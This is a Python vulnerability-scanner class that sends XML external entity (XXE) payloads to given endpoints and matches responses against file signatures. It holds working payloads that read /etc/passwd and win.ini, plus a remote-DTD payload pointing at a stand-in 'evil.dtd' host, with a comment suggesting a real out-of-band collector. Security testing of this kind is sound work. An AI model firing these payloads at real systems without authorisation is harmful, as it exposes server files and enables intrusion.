import requests


class XXETester:
    """
    Advanced tester for detecting possible XXE vulnerabilities.
    Includes local file inclusion and remote DTD attempts.
    """

    def __init__(self, session=None):
        self.session = session or requests.Session()
        self.vulnerable = []

        # Multiple payloads: local file, Windows, remote DTD
        self.xxe_payloads = [
            """<?xml version="1.0"?>
            <!DOCTYPE foo [ <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
            <foo>&xxe;</foo>""",

            """<?xml version="1.0"?>
            <!DOCTYPE foo [ <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini" >]>
            <foo>&xxe;</foo>""",

            """<?xml version="1.0"?>
            <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://example.com/evil.dtd"> %xxe; ]>
            <foo>bar</foo>"""
            # You can replace "http://example.com/evil.dtd" with your real OOB collector!
        ]

        # Heuristic signatures
        self.evidence_signatures = [
            "root:x:",
            "[fonts]",
            "[boot loader]",
            "param entity"
        ]

    def test_endpoint(self, url):
        """
        Send malicious XML payloads to the endpoint.
        """
        headers_list = [
            {"Content-Type": "application/xml"},
            {"Content-Type": "text/xml"},
        ]

        for payload in self.xxe_payloads:
            for headers in headers_list:
                try:
                    resp = self.session.post(url, data=payload.strip(), headers=headers, timeout=10)
                    resp_text = resp.text.lower()

                    for sig in self.evidence_signatures:
                        if sig in resp_text:
                            vuln = {
                                "url": url,
                                "vuln_type": "XXE",
                                "severity": "Critical",
                                "payload": payload.strip()[:100],
                                "evidence": f"Matched signature: '{sig}' | Snippet: {resp.text[:200]}"
                            }
                            self.vulnerable.append(vuln)
                            print(f"[+] Possible XXE: {url} (matched: {sig})")
                            break  # Stop once we confirm

                except requests.RequestException as e:
                    print(f"[!] Error testing XXE at {url}: {e}")

    def run(self, url_list):
        """
        Run XXE tests on all given endpoints.
        """
        for url in url_list:
            self.test_endpoint(url)
        return self.vulnerable

